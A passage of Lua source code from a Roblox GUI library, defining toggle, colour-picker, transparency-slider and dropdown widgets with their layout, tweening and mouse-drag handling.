									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											keybindremove(text, Element.value.Key) 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
									end 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										values[tabname][sectorname][tabtext][text] = Element.value 
										update() 
										callback(Element.value) 
									end 
								elseif type == "ToggleColor" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255)} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 









									local ColorH,ColorS,ColorV 

									local ColorP = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Colorpick = C.INST("ImageButton") 
									local ColorDrag = C.INST("Frame") 
									local Huepick = C.INST("ImageButton") 
									local Huedrag = C.INST("Frame") 

									ColorP.Name = "ColorP" 
									ColorP.Parent = Button 
									ColorP.AnchorPoint = C.Vec2(1, 0) 
									ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
									ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
									ColorP.Size = C.UDIM2(0, 18, 0, 8) 
									ColorP.AutoButtonColor = false 
									ColorP.Font = Enum.Font.Gotham 
									ColorP.Text = "" 
									ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
									ColorP.TextSize = 11.000

									Frame.Parent = ColorP 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
									Frame.Size = C.UDIM2(0, 200, 0, 170) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Colorpick.Name = "Colorpick" 
									Colorpick.Parent = Frame 
									Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Colorpick.ClipsDescendants = false 
									Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
									Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
									Colorpick.AutoButtonColor = false 
									Colorpick.Image = "rbxassetid://4155801252" 
									Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Colorpick.ZIndex = 3 

									ColorDrag.Name = "ColorDrag" 
									ColorDrag.Parent = Colorpick 
									ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
									ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
									ColorDrag.ZIndex = 3 

									Huepick.Name = "Huepick" 
									Huepick.Parent = Frame 
									Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huepick.ClipsDescendants = false 
									Huepick.Position = C.UDIM2(0, 10, 0, 10) 
									Huepick.Size = C.UDIM2(0, 20, 0, 150) 
									Huepick.AutoButtonColor = false 
									Huepick.Image = "rbxassetid://3641079629" 
									Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Huepick.ImageTransparency = 1 
									Huepick.BackgroundTransparency = 0 
									Huepick.ZIndex = 3 

									local HueFrameGradient = C.INST("UIGradient") 
									HueFrameGradient.Rotation = 90 
									HueFrameGradient.Name = "HueFrameGradient" 
									HueFrameGradient.Parent = Huepick 
									HueFrameGradient.Color = ColorSequence.new { 
										ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
										ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
										ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
										ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
										ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
										ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
										ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
									}	 

									Huedrag.Name = "Huedrag" 
									Huedrag.Parent = Huepick 
									Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
									Huedrag.ZIndex = 3 

									ColorP.MouseButton1Down:Connect(function() 
										Frame.Visible = not Frame.Visible 
									end) 
									local abc = false 
									local inCP = false 
									ColorP.MouseEnter:Connect(function() 
										abc = true 
									end) 
									ColorP.MouseLeave:Connect(function() 
										abc = false 
									end) 
									Frame.MouseEnter:Connect(function() 
										inCP = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										inCP = false 
									end) 

									ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
									ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

									if data.default.Color ~= nil then 
										ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 
										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 

									local mouse = LocalPlayer:GetMouse() 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if not dragging and not abc and not inCP then 
												Frame.Visible = false 
											end 
										end 
									end) 

									local function updateColor() 
										local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
										local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
										ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
										ColorS = 1-ColorX 
										ColorV = 1-ColorY 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateHue() 
										local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
										Huedrag.Position = C.UDIM2(0, 0, 0, y) 
										hue = y/148 
										ColorH = 1-hue 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end
									Colorpick.MouseButton1Down:Connect(function() 
										updateColor() 
										moveconnection = mouse.Move:Connect(function() 
											updateColor() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateColor() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Huepick.MouseButton1Down:Connect(function() 
										updateHue() 
										moveconnection = mouse.Move:Connect(function() 
											updateHue() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateHue() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
										ColorH, ColorS, ColorV = duplicate:ToHSV() 
										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 

										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										update() 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
								elseif type == "ToggleTrans" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), Transparency = data.default and data.default.Transparency or 0} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 

									local ColorH,ColorS,ColorV 

									local ColorP = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Colorpick = C.INST("ImageButton") 
									local ColorDrag = C.INST("Frame") 
									local Huepick = C.INST("ImageButton") 
									local Huedrag = C.INST("Frame") 

									ColorP.Name = "ColorP" 
									ColorP.Parent = Button 
									ColorP.AnchorPoint = C.Vec2(1, 0) 
									ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
									ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
									ColorP.Size = C.UDIM2(0, 18, 0, 8) 
									ColorP.AutoButtonColor = false 
									ColorP.Font = Enum.Font.Gotham 
									ColorP.Text = "" 
									ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
									ColorP.TextSize = 11.000

									Frame.Parent = ColorP 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
									Frame.Size = C.UDIM2(0, 200, 0, 190) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Colorpick.Name = "Colorpick" 
									Colorpick.Parent = Frame 
									Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Colorpick.ClipsDescendants = false 
									Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
									Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
									Colorpick.AutoButtonColor = false 
									Colorpick.Image = "rbxassetid://4155801252" 
									Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Colorpick.ZIndex = 3 

									ColorDrag.Name = "ColorDrag" 
									ColorDrag.Parent = Colorpick 
									ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
									ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
									ColorDrag.ZIndex = 3 

									Huepick.Name = "Huepick" 
									Huepick.Parent = Frame 
									Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huepick.ClipsDescendants = true 
									Huepick.Position = C.UDIM2(0, 10, 0, 10) 
									Huepick.Size = C.UDIM2(0, 20, 0, 150) 
									Huepick.AutoButtonColor = false 
									Huepick.Image = "rbxassetid://3641079629" 
									Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
									Huepick.ImageTransparency = 1 
									Huepick.BackgroundTransparency = 0 
									Huepick.ZIndex = 3 

									local HueFrameGradient = C.INST("UIGradient") 
									HueFrameGradient.Rotation = 90 
									HueFrameGradient.Name = "HueFrameGradient" 
									HueFrameGradient.Parent = Huepick 
									HueFrameGradient.Color = ColorSequence.new { 
										ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
										ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
										ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
										ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
										ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
										ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
										ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
									}	 

									Huedrag.Name = "Huedrag" 
									Huedrag.Parent = Huepick 
									Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
									Huedrag.ZIndex = 3 

									local Transpick = C.INST("ImageButton") 
									local Transcolor = C.INST("ImageLabel") 
									local Transdrag = C.INST("Frame") 

									Transpick.Name = "Transpick" 
									Transpick.Parent = Frame 
									Transpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Transpick.Position = C.UDIM2(0, 10, 0, 167) 
									Transpick.Size = C.UDIM2(0, 180, 0, 15) 
									Transpick.AutoButtonColor = false 
									Transpick.Image = "rbxassetid://3887014957" 
									Transpick.ScaleType = Enum.ScaleType.Tile 
									Transpick.TileSize = C.UDIM2(0, 10, 0, 10) 
									Transpick.ZIndex = 3 

									Transcolor.Name = "Transcolor" 
									Transcolor.Parent = Transpick 
									Transcolor.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transcolor.BackgroundTransparency = 1.000 
									Transcolor.Size = C.UDIM2(1, 0, 1, 0) 
									Transcolor.Image = "rbxassetid://3887017050" 
									Transcolor.ImageColor3 = C.COL3RGB(255, 0, 4) 
									Transcolor.ZIndex = 3 

									Transdrag.Name = "Transdrag" 
									Transdrag.Parent = Transcolor 
									Transdrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Transdrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Transdrag.Position = C.UDIM2(0, -1, 0, 0) 
									Transdrag.Size = C.UDIM2(0, 2, 1, 0) 
									Transdrag.ZIndex = 3 

									ColorP.MouseButton1Down:Connect(function() 
										Frame.Visible = not Frame.Visible 
									end) 
									local abc = false 
									local inCP = false 
									ColorP.MouseEnter:Connect(function() 
										abc = true 
									end) 
									ColorP.MouseLeave:Connect(function() 
										abc = false 
									end) 
									Frame.MouseEnter:Connect(function() 
										inCP = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										inCP = false 
									end) 

									ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
									ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

									if data.default.Color ~= nil then 
										ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 
										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
									if data.default.Transparency ~= nil then 
										Transdrag.Position = C.UDIM2(data.default.Transparency, -1, 0, 0) 
									end 
									local mouse = LocalPlayer:GetMouse() 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if not dragging and not abc and not inCP then 
												Frame.Visible = false 
											end 
										end 
									end) 

									local function updateColor() 
										local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
										local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
										ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
										ColorS = 1-ColorX 
										ColorV = 1-ColorY 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateHue() 
										local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
										Huedrag.Position = C.UDIM2(0, 0, 0, y) 
										hue = y/148 
										ColorH = 1-hue 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
										callback(Element.value) 
									end 
									local function updateTrans() 
										local x = C.CLAMP(mouse.X - Transpick.AbsolutePosition.X, 0, 178) 
										Transdrag.Position = C.UDIM2(0, x, 0, 0) 
										Element.value.Transparency = (x/178) 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 
									Transpick.MouseButton1Down:Connect(function() 
										updateTrans() 
										moveconnection = mouse.Move:Connect(function() 
											updateTrans() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateTrans() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Colorpick.MouseButton1Down:Connect(function() 
										updateColor() 
										moveconnection = mouse.Move:Connect(function() 
											updateColor() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateColor() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 
									Huepick.MouseButton1Down:Connect(function() 
										updateHue() 
										moveconnection = mouse.Move:Connect(function() 
											updateHue() 
										end) 
										releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
											if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
												updateHue() 
												moveconnection:Disconnect() 
												releaseconnection:Disconnect() 
											end 
										end) 
									end) 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
										ColorH, ColorS, ColorV = duplicate:ToHSV() 
										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 

										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										update() 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
								elseif type == "Dropdown" then 
									tabsize = tabsize + C.UDIM2(0,0,0,39) 
									Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 

									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = tab1 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = Element.value.Dropdown 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = MainUIColor 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									local num = #data.options 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									Drop.CanvasSize = C.UDIM2(1, 0, 0, 17*num) 
									local first = true 

									for i,v in ipairs(data.options) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
